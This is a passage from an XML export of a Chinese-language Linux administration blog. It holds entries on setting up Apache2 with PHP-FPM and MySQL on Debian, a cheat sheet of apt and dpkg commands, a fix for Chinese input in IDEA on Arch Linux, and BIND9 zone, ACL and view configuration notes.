    <content><![CDATA[<p>缺少依赖,安装 <strong>akonadi-backend-mysql</strong></p>
]]></content>
      <categories>
        <category>answer&amp;question</category>
      </categories>
  </entry>
  <entry>
    <title>apache-httpd(apache2) 配置文件</title>
    <url>/apache-httpd-apache2-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h4 id="安装中间件">安装中间件</h4>
<h5 id="debian安装apache2-php-7.2-mysql">Debian安装apache2 php-7.2
mysql</h5>
<h2 id="section"><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade </span><br><span class="line"></span><br><span class="line">wget -O /etc/apt/trusted.gpg.d/php.gpg https://mirror.xtom.com.hk/sury/php/apt.gpg</span><br><span class="line">apt-get install apt-transport-https</span><br><span class="line">wget https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb</span><br><span class="line">dpkg -i mysql-apt-config_0.8.12-1_all.deb</span><br><span class="line">sh -c <span class="string">&#x27;echo &quot;deb https://packages.sury.org/php/ $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/php.list&#x27;</span></span><br><span class="line">apt-get update</span><br><span class="line">aptitude install apache2 php7.2-fpm php7.2-mysql php7.2-curl php7.2-gd php7.2-mbstring php7.2-xml php7.2-xmlrpc php7.2-zip php7.2-opcache mysql-server</span><br><span class="line"></span><br><span class="line">a2enmod rewrite </span><br><span class="line">a2enmod proxy</span><br><span class="line">a2enmod proxy_fcgi</span><br><span class="line"></span><br><span class="line">systemctl restart mysql</span><br><span class="line">systemctl restart php-fpm</span><br><span class="line">systemctl restart apache2</span><br></pre></td></tr></table></figure></h2>
<h4 id="apache2配置">apache2配置</h4>
<h5 id="conf-enable-下面写一个.conf文件-我命名为v-host.conf">conf-enable
下面写一个.conf文件 我命名为v-host.conf</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;                                </span><br><span class="line">        DocumentRoot &quot;/home/divint3/WWW/tp5/public&quot;</span><br><span class="line">        ServerName www.divint3.com                        </span><br><span class="line">        ServerAlias divint3.com</span><br><span class="line">        DirectoryIndex index.htm index.php index.html</span><br><span class="line"></span><br><span class="line">  &lt;Directory &quot;/home/divint3/WWW/tp5/public&quot;&gt;</span><br><span class="line">        Options FollowSymLinks ExecCGI</span><br><span class="line">        AllowOverride All</span><br><span class="line">        Order allow,deny</span><br><span class="line">        Allow from all</span><br><span class="line">        Require all granted</span><br><span class="line">        Satisfy all </span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">        ProxyRequests Off</span><br><span class="line">        ProxyPassMatch ^/(.*\.php(/.*)?)$ unix:/run/php/php7.2-fpm.sock|fcgi://localhost/home/divint3/WWW/tp5/public/</span><br><span class="line">        //如果是pid文件的 fcgi末尾要加一个$1</span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
<h5 id="重写规则">重写规则</h5>
<p>.htaccess文件内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">  Options +FollowSymlinks -Multiviews</span><br><span class="line">  RewriteEngine On</span><br><span class="line"></span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">  RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">  RewriteRule ^(.*)$ index.php?s=$1 [QSA,PT,L]  </span><br><span class="line">  //写的是rewrite规则,可以省略index.php文件访问</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>运维</category>
      </categories>
  </entry>
  <entry>
    <title>apt-各种参数详解</title>
    <url>/apt-%E5%90%84%E7%A7%8D%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="apt软件包管理器">apt软件包管理器</h3>
<p><a
href="https://mritd.me/2015/12/06/apt-get%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">apt-get常用命令</a></p>
<h4 id="安装升级删除">安装升级删除:</h4>
<h5 id="查看软件xxx安装内容">查看软件xxx安装内容</h5>
<p>dpkg -L xxx 查找软件库中的软件
<code>apt-cache search 正则表达式</code> 或
<code>aptitude search 软件包</code></p>
<h5 id="显示系统安装包的统计信息">显示系统安装包的统计信息</h5>
<p><code>apt-cache stats</code></p>
<h5 id="显示系统全部可用包的名称">显示系统全部可用包的名称</h5>
<p><code>apt-cache pkgnames</code></p>
<h5 id="显示包的信息">显示包的信息</h5>
<p><code>apt-cache show k3b</code></p>
<h5 id="查找文件属于哪个包">查找文件属于哪个包</h5>
<p><code>apt-file search filename</code></p>
<h5 id="查看已经安装了哪些包">查看已经安装了哪些包</h5>
<p><code>dpkg -l</code></p>
<h5 id="查询软件xxx依赖哪些包">查询软件xxx依赖哪些包</h5>
<p><code>apt-cache depends xxx</code></p>
<h5 id="查询软件xxx被哪些包依赖">查询软件xxx被哪些包依赖</h5>
<p><code>apt-cache rdepends xxx</code></p>
<h5 id="增加一个光盘源">增加一个光盘源</h5>
<p>sudo apt-cdrom add</p>
<h5 id="系统升级">系统升级</h5>
<p><code>sudo apt-get update</code> (这一步更新包列表)</p>
<p><code>sudo apt-get dist-upgrade</code> (这一步安装所有可用更新) 或者
<code>sudo apt-get upgrade</code>
(这一步安装应用程序更新，不安装新内核等)</p>
<h5 id="编译时缺少h文件的自动处理">编译时缺少h文件的自动处理</h5>
<p><code>sudo auto-apt run ./configure</code></p>
<h5
id="查看安装软件时下载包的临时存放目录">查看安装软件时下载包的临时存放目录</h5>
<p><code>ls /var/cache/apt/archives</code></p>
<h5
id="备份当前系统安装的所有包的列表">备份当前系统安装的所有包的列表</h5>
<p><code>dpkg --get-selections | grep -v deinstall &gt; ~/somefile</code></p>
<h5
id="从上面备份的安装包的列表文件恢复所有包">从上面备份的安装包的列表文件恢复所有包</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg --set-selections &lt; ~/somefile </span><br><span class="line">sudo dselect </span><br></pre></td></tr></table></figure>
<h5 id="清理旧版本的软件缓存">清理旧版本的软件缓存</h5>
<p><code>sudo apt-get autoclean</code></p>
<h5 id="清理所有软件缓存">清理所有软件缓存</h5>
<p><code>sudo apt-get clean</code></p>
<h5 id="删除系统不再使用的孤立软件">删除系统不再使用的孤立软件</h5>
<p><code>sudo apt-get autoremove</code></p>
<h5 id="purge参数彻底删除文件">purge参数彻底删除文件:</h5>
<p><code>sudo apt-get purge virtualbox</code>
<code>sudo apt-get autoremove</code> <code>sudo apt-get clean</code></p>
<h5
id="只是删除软件的链接并不实际删除软件的配置文件和实体文件">只是删除软件的链接，并不实际删除软件的配置文件和实体文件。</h5>
<p><code>apt-get remove</code></p>
<h5
id="清除所有已删除包的残余配置文件配置文件">清除所有已删除包的残余配置文件配置文件</h5>
<p><code>dpkg -l |grep ^rc|awk '&#123;print $2&#125;' |sudo xargs dpkg -P</code></p>
<h6
id="如果报如下错误证明你的系统中没有残留配置文件了无须担心">如果报如下错误，证明你的系统中没有残留配置文件了，无须担心。</h6>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg: --purge needs at least one package name argument </span><br><span class="line"></span><br><span class="line">Type dpkg --help for help about installing and deinstalling packages</span><br><span class="line">;</span><br><span class="line">Use &#x27;dselect&#x27; or &#x27;aptitude&#x27; for user-friendly package management; </span><br><span class="line">Type dpkg -Dhelp for a list of dpkg debug flag values; </span><br><span class="line">Type dpkg --force-help for a list of forcing options; </span><br><span class="line">Type dpkg-deb --help for help about manipulating *.deb files; </span><br><span class="line">Type dpkg --license for copyright license and lack of warranty (GNU GPL)</span><br><span class="line">.</span><br><span class="line"></span><br><span class="line">Options marked</span><br><span class="line">produce a lot of output - pipe it through &#x27;less&#x27; or &#x27;more&#x27; !</span><br></pre></td></tr></table></figure>
<h5 id="查看包在服务器上面的地址">查看包在服务器上面的地址</h5>
<p><code>apt-get -qq --print-uris install ssh | cut -d\' -f2</code></p>
<h5 id="彻底删除gnome">彻底删除Gnome</h5>
<p><code>apt-get --purge remove liborbit2</code></p>
<h5 id="彻底删除kde">彻底删除KDE</h5>
<p><code>apt-get --purge remove libqt3-mt libqtcore4</code></p>
<h5 id="一键安装-lamp-服务">一键安装 LAMP 服务</h5>
<p><code>sudo tasksel install lamp-server</code></p>
<h5 id="删除旧内核">删除旧内核</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo aptitude purge ~ilinux-image-.*\(\!`uname -r`\) </span><br></pre></td></tr></table></figure>
<h5 id="导入ppa源的key值">导入ppa源的key值</h5>
<p>W: GPG签名验证错误： http://ppa.launchpad.net jaunty Release:
由于没有公钥，下列签名无法进行验证： NO_PUBKEY 5126890CDCC7AFE0
<code>sudo apt-key adv --recv-keys --keyserver keyserver.ubuntu.com 5126890CDCC7AFE0</code>
#5126890CDCC7AFE0替换为你需要导入的Key值</p>
<h5 id="增加一个ppa源">增加一个ppa源</h5>
<p><code>sudo add-apt-repository ppa:user/ppa-name</code> 使用 ppa
的地址替换 ppa:user/ppa-name</p>
<h4 id="dpkg-查看软件包依赖">dpkg 查看软件包依赖</h4>
<p><code>dpkg -I package.deb</code></p>
<h3 id="dpkg-查看生成文件">dpkg 查看生成文件</h3>
<p><code>dpkg -L package_name</code></p>
]]></content>
      <categories>
        <category>linux软件</category>
      </categories>
  </entry>
  <entry>
    <title>archLinux-Idea不能输入中文的解决办法</title>
    <url>/archLinux-Idea%E4%B8%8D%E8%83%BD%E8%BE%93%E5%85%A5%E4%B8%AD%E6%96%87%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<p>如果使用startx,startxfce4，在用户文件夹下的<code>.xinitrc</code>或<code>.xprofile</code>文件中输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LC_CTYPE=zh_CN.UTF-8</span><br></pre></td></tr></table></figure>
<p>即可解决问题</p>
]]></content>
      <categories>
        <category>ArchLinux</category>
      </categories>
  </entry>
  <entry>
    <title>bind9-笔记</title>
    <url>/bind9-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="bind9">bind9</h1>
<h2 id="主配置文件">主配置文件</h2>
<p><code>/etc/bind/bind.conf</code></p>
<h3 id="引入配置文件卸载主配置文件中">引入配置文件,卸载主配置文件中</h3>
<p>每个条目后面应该加上分号做分割</p>
<p><code>include "/etc/bind/myconf.conf";</code> <span id="more"></span></p>
<h3 id="zone区域">zone：区域</h3>
<p><strong>定义格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zone string optional_class &#123;</span><br><span class="line">type ( master | slave | stub | hint |</span><br><span class="line">/*</span><br><span class="line">Master（主域）：主域用来保存某个区域（如www.wzvtc.cn）的数据信息。</span><br><span class="line">Slave（辅域）：也叫次级域，数据来自主域，起备份作用。</span><br><span class="line">Stub：Stub区与辅域相似，但它只复制主域的NS记录，而不是整个区数据。它不是标准DNS的功能，只是BIND提供的功能。</span><br><span class="line">Forward（转发）：转发域中一般配置了 forward和forwarders子句，用于把对该域的查询请求转由其他DNS服务器处理。</span><br><span class="line">Hint：Hint域定义了一套最新的根DNS服务器地址，如果没有定义，DNS服务器会使用内建的根DNS服务器地址。</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">forward | delegation-only );</span><br><span class="line"></span><br><span class="line">file quoted_string;</span><br><span class="line"></span><br><span class="line">masters [ port integer ] &#123;</span><br><span class="line"></span><br><span class="line">( masters |</span><br><span class="line"></span><br><span class="line">ipv4_address [port integer] |</span><br><span class="line"></span><br><span class="line">ipv6_address [ port integer ] ) [ key string ]; ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">database string;</span><br><span class="line"></span><br><span class="line">delegation-only boolean;</span><br><span class="line"></span><br><span class="line">check-names ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-mx ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-integrity boolean;</span><br><span class="line"></span><br><span class="line">check-mx-cname ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-srv-cname ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">dialup dialuptype;</span><br><span class="line"></span><br><span class="line">ixfr-from-differences boolean;</span><br><span class="line"></span><br><span class="line">journal quoted_string;</span><br><span class="line"></span><br><span class="line">zero-no-soa-ttl boolean;</span><br><span class="line"></span><br><span class="line">dnssec-secure-to-insecure boolean;</span><br><span class="line"></span><br><span class="line">allow-query &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-query-on &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-transfer &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-update &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-update-forwarding &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">update-policy local | &#123;</span><br><span class="line"></span><br><span class="line">( grant | deny ) string</span><br><span class="line"></span><br><span class="line">( name | subdomain | wildcard | self | selfsub | selfwild |</span><br><span class="line"></span><br><span class="line">krb5-self | ms-self | krb5-subdomain | ms-subdomain |</span><br><span class="line">tcp-self | zonesub | 6to4-self ) string</span><br><span class="line">rrtypelist;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">update-check-ksk boolean;</span><br><span class="line"></span><br><span class="line">dnssec-dnskey-kskonly boolean;</span><br><span class="line"></span><br><span class="line">masterfile-format ( text | raw );</span><br><span class="line"></span><br><span class="line">notify notifytype;</span><br><span class="line"></span><br><span class="line">notify-source ( ipv4_address | * ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">notify-source-v6 ( ipv6_address | * ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">notify-delay seconds;</span><br><span class="line"></span><br><span class="line">notify-to-soa boolean;</span><br><span class="line"></span><br><span class="line">also-notify [ port integer ] &#123; ( ipv4_address | ipv6_address )</span><br><span class="line"></span><br><span class="line">[ port integer ]; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-notify &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">forward ( first | only );</span><br><span class="line"></span><br><span class="line">forwarders [ port integer ] &#123;</span><br><span class="line"></span><br><span class="line">( ipv4_address | ipv6_address ) [ port integer ]; ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">max-journal-size size_no_default;</span><br><span class="line"></span><br><span class="line">max-transfer-time-in integer;</span><br><span class="line"></span><br><span class="line">max-transfer-time-out integer;</span><br><span class="line"></span><br><span class="line">max-transfer-idle-in integer;</span><br><span class="line"></span><br><span class="line">max-transfer-idle-out integer;</span><br><span class="line"></span><br><span class="line">max-retry-time integer;</span><br><span class="line"></span><br><span class="line">min-retry-time integer;</span><br><span class="line"></span><br><span class="line">max-refresh-time integer;</span><br><span class="line"></span><br><span class="line">min-refresh-time integer;</span><br><span class="line"></span><br><span class="line">multi-master boolean;</span><br><span class="line"></span><br><span class="line">sig-validity-interval integer;</span><br><span class="line"></span><br><span class="line">transfer-source ( ipv4_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">transfer-source-v6 ( ipv6_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">alt-transfer-source ( ipv4_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">alt-transfer-source-v6 ( ipv6_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">use-alt-transfer-source boolean;</span><br><span class="line"></span><br><span class="line">zone-statistics boolean;</span><br><span class="line"></span><br><span class="line">try-tcp-refresh boolean;</span><br><span class="line"></span><br><span class="line">key-directory quoted_string;</span><br><span class="line"></span><br><span class="line">nsec3-test-zone boolean; // testing only</span><br><span class="line"></span><br><span class="line">ixfr-base quoted_string; // obsolete</span><br><span class="line"></span><br><span class="line">ixfr-tmp-file quoted_string; // obsolete</span><br><span class="line"></span><br><span class="line">maintain-ixfr-base boolean; // obsolete</span><br><span class="line"></span><br><span class="line">max-ixfr-log-size size; // obsolete</span><br><span class="line"></span><br><span class="line">pubkey integer integer integer quoted_string; // obsolete</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="zone配置文件样例">zone配置文件样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cat myconf.conf </span><br><span class="line">zone &quot;divint3.club&quot; &#123;</span><br><span class="line">        type master; //主类型</span><br><span class="line">        file &quot;/etc/bind/db.club&quot;; //区域配置文件</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">zone &quot;124.93.47.in-addr.arpa&quot; &#123;</span><br><span class="line">        type master;</span><br><span class="line">        file &quot;/etc/bind/db.47&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="acl访问控制列表">acl：访问控制列表</h3>
<p><strong>定义格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl acl-name &#123;   </span><br><span class="line">    address_match_list   </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure>
<h4 id="acl配置文件样例">acl配置文件样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl &quot;divint3&quot; &#123;</span><br><span class="line">	192.168.0.1; 192.168.0.2; 192.168.0.3; //定义一个acl列表，包含了三个ip</span><br><span class="line">&#125;;</span><br><span class="line">zone &quot;divint3.club&quot; &#123;</span><br><span class="line">	type master;</span><br><span class="line">	file &quot;/etc/bind/db.club&quot;;</span><br><span class="line">	allow-query&#123;&quot;divint3&quot;&#125;; //引用acl列表	</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="view-视图">view ：视图</h3>
<p><strong>格式定义</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">view string optional_class &#123;</span><br><span class="line">match-clients &#123; address_match_element; ... &#125;;</span><br><span class="line">match-destinations &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">match-recursive-only boolean;</span><br><span class="line"></span><br><span class="line">key string &#123;</span><br><span class="line"></span><br><span class="line">algorithm string;</span><br><span class="line"></span><br><span class="line">secret string;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zone string optional_class &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">server ( ipv4_address[/prefixlen] | ipv6_address[/prefixlen] ) &#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">trusted-keys &#123;</span><br><span class="line"></span><br><span class="line">string integer integer integer quoted_string;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">allow-recursion &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-recursion-on &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">sortlist &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">topology &#123; address_match_element; ... &#125;; // not implemented</span><br><span class="line"></span><br><span class="line">auth-nxdomain boolean; // default changed</span><br><span class="line"></span><br><span class="line">minimal-responses boolean;</span><br><span class="line"></span><br><span class="line">recursion boolean;</span><br><span class="line"></span><br><span class="line">rrset-order &#123;</span><br><span class="line"></span><br><span class="line">[ class string ] [ type string ]</span><br><span class="line"></span><br><span class="line">[ name quoted_string ] string string; ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">provide-ixfr boolean;</span><br><span class="line"></span><br><span class="line">request-ixfr boolean;</span><br><span class="line"></span><br><span class="line">rfc2308-type1 boolean; // not yet implemented</span><br><span class="line"></span><br><span class="line">additional-from-auth boolean;</span><br><span class="line"></span><br><span class="line">additional-from-cache boolean;</span><br><span class="line"></span><br><span class="line">query-source ( ( ipv4_address | * ) | [ address ( ipv4_address | * ) ] ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">query-source-v6 ( ( ipv6_address | * ) | [ address ( ipv6_address | * ) ] ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">use-queryport-pool boolean;</span><br><span class="line"></span><br><span class="line">queryport-pool-ports integer;</span><br><span class="line"></span><br><span class="line">queryport-pool-updateinterval integer;</span><br><span class="line"></span><br><span class="line">cleaning-interval integer;</span><br><span class="line"></span><br><span class="line">resolver-query-timeout integer;</span><br><span class="line"></span><br><span class="line">min-roots integer; // not implemented</span><br><span class="line"></span><br><span class="line">lame-ttl integer;</span><br><span class="line"></span><br><span class="line">max-ncache-ttl integer;</span><br><span class="line"></span><br><span class="line">max-cache-ttl integer;</span><br><span class="line"></span><br><span class="line">transfer-format ( many-answers | one-answer );</span><br><span class="line"></span><br><span class="line">max-cache-size size;</span><br><span class="line"></span><br><span class="line">max-acache-size size;</span><br><span class="line"></span><br><span class="line">clients-per-query number;</span><br><span class="line"></span><br><span class="line">max-clients-per-query number;</span><br><span class="line"></span><br><span class="line">check-names ( master | slave | response )</span><br><span class="line"></span><br><span class="line">( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-mx ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-integrity boolean;</span><br><span class="line"></span><br><span class="line">check-mx-cname ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">check-srv-cname ( fail | warn | ignore );</span><br><span class="line"></span><br><span class="line">cache-file quoted_string; // test option</span><br><span class="line"></span><br><span class="line">suppress-initial-notify boolean; // not yet implemented</span><br><span class="line"></span><br><span class="line">preferred-glue string;</span><br><span class="line"></span><br><span class="line">dual-stack-servers [ port integer ] &#123;</span><br><span class="line"></span><br><span class="line">( quoted_string [port integer] |</span><br><span class="line"></span><br><span class="line">ipv4_address [port integer] |</span><br><span class="line"></span><br><span class="line">ipv6_address [port integer] ); ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">edns-udp-size integer;</span><br><span class="line"></span><br><span class="line">max-udp-size integer;</span><br><span class="line"></span><br><span class="line">root-delegation-only [ exclude &#123; quoted_string; ... &#125; ];</span><br><span class="line"></span><br><span class="line">disable-algorithms string &#123; string; ... &#125;;</span><br><span class="line"></span><br><span class="line">dnssec-enable boolean;</span><br><span class="line"></span><br><span class="line">dnssec-validation boolean;</span><br><span class="line"></span><br><span class="line">dnssec-lookaside ( auto | no | domain trust-anchor domain );</span><br><span class="line"></span><br><span class="line">dnssec-must-be-secure string boolean;</span><br><span class="line"></span><br><span class="line">dnssec-accept-expired boolean;</span><br><span class="line"></span><br><span class="line">dns64-server string;</span><br><span class="line"></span><br><span class="line">dns64-contact string;</span><br><span class="line"></span><br><span class="line">dns64 prefix &#123;</span><br><span class="line"></span><br><span class="line">clients &#123; &lt;replacable&gt;acl&lt;/replacable&gt;; &#125;;</span><br><span class="line"></span><br><span class="line">exclude &#123; &lt;replacable&gt;acl&lt;/replacable&gt;; &#125;;</span><br><span class="line"></span><br><span class="line">mapped &#123; &lt;replacable&gt;acl&lt;/replacable&gt;; &#125;;</span><br><span class="line"></span><br><span class="line">break-dnssec boolean;</span><br><span class="line"></span><br><span class="line">recursive-only boolean;</span><br><span class="line"></span><br><span class="line">suffix ipv6_address;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">empty-server string;</span><br><span class="line"></span><br><span class="line">empty-contact string;</span><br><span class="line"></span><br><span class="line">empty-zones-enable boolean;</span><br><span class="line"></span><br><span class="line">disable-empty-zone string;</span><br><span class="line"></span><br><span class="line">dialup dialuptype;</span><br><span class="line"></span><br><span class="line">ixfr-from-differences ixfrdiff;</span><br><span class="line"></span><br><span class="line">allow-query &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-query-on &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-query-cache &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-query-cache-on &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-transfer &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-update &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-update-forwarding &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">update-check-ksk boolean;</span><br><span class="line"></span><br><span class="line">dnssec-dnskey-kskonly boolean;</span><br><span class="line"></span><br><span class="line">masterfile-format ( text | raw );</span><br><span class="line"></span><br><span class="line">notify notifytype;</span><br><span class="line"></span><br><span class="line">notify-source ( ipv4_address | * ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">notify-source-v6 ( ipv6_address | * ) [ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">notify-delay seconds;</span><br><span class="line"></span><br><span class="line">notify-to-soa boolean;</span><br><span class="line"></span><br><span class="line">also-notify [ port integer ] &#123; ( ipv4_address | ipv6_address )</span><br><span class="line"></span><br><span class="line">[ port integer ]; ... &#125;;</span><br><span class="line"></span><br><span class="line">allow-notify &#123; address_match_element; ... &#125;;</span><br><span class="line"></span><br><span class="line">forward ( first | only );</span><br><span class="line"></span><br><span class="line">forwarders [ port integer ] &#123;</span><br><span class="line"></span><br><span class="line">( ipv4_address | ipv6_address ) [ port integer ]; ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">max-journal-size size_no_default;</span><br><span class="line"></span><br><span class="line">max-transfer-time-in integer;</span><br><span class="line"></span><br><span class="line">max-transfer-time-out integer;</span><br><span class="line"></span><br><span class="line">max-transfer-idle-in integer;</span><br><span class="line"></span><br><span class="line">max-transfer-idle-out integer;</span><br><span class="line"></span><br><span class="line">max-retry-time integer;</span><br><span class="line"></span><br><span class="line">min-retry-time integer;</span><br><span class="line"></span><br><span class="line">max-refresh-time integer;</span><br><span class="line"></span><br><span class="line">min-refresh-time integer;</span><br><span class="line"></span><br><span class="line">multi-master boolean;</span><br><span class="line"></span><br><span class="line">sig-validity-interval integer;</span><br><span class="line"></span><br><span class="line">transfer-source ( ipv4_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">transfer-source-v6 ( ipv6_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">alt-transfer-source ( ipv4_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">alt-transfer-source-v6 ( ipv6_address | * )</span><br><span class="line"></span><br><span class="line">[ port ( integer | * ) ];</span><br><span class="line"></span><br><span class="line">use-alt-transfer-source boolean;</span><br><span class="line"></span><br><span class="line">zone-statistics boolean;</span><br><span class="line"></span><br><span class="line">try-tcp-refresh boolean;</span><br><span class="line"></span><br><span class="line">key-directory quoted_string;</span><br><span class="line"></span><br><span class="line">zero-no-soa-ttl boolean;</span><br><span class="line"></span><br><span class="line">zero-no-soa-ttl-cache boolean;</span><br><span class="line"></span><br><span class="line">dnssec-secure-to-insecure boolean;</span><br><span class="line"></span><br><span class="line">allow-v6-synthesis &#123; address_match_element; ... &#125;; // obsolete</span><br><span class="line"></span><br><span class="line">fetch-glue boolean; // obsolete</span><br><span class="line"></span><br><span class="line">maintain-ixfr-base boolean; // obsolete</span><br><span class="line"></span><br><span class="line">max-ixfr-log-size size; // obsolete</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="视图配置文件样例">视图配置文件样例：</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acl &quot;CNS&quot;&#123; //China Net Segment</span><br><span class="line">	1.0.1.0/24; ……;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">acl &quot;OOC&quot;&#123; //Out Of China</span><br><span class="line">	1.1.1.0/24;……；</span><br><span class="line">&#125;；</span><br><span class="line"></span><br><span class="line">view &quot;China&quot; &#123;</span><br><span class="line">	match-clients &#123;CNS&#125;;</span><br><span class="line">	recusion yes; //允许递归</span><br><span class="line">	zone divint3.club &#123;</span><br><span class="line">		type master;</span><br><span class="line">        file &quot;/etc/bind/db.club&quot;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">view &quot;OutOfChina&quot; &#123;</span><br><span class="line">	match-clients&#123;OOC&#125;;</span><br><span class="line">	recusion no;</span><br><span class="line">	zone divint3.club&#123;</span><br><span class="line">		type master;</span><br><span class="line">		file &quot;/etc/bind/db.ooc.club&quot;;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="logging日志文件配置">logging：日志文件配置</h3>
<p><strong>定义格式：</strong></p>
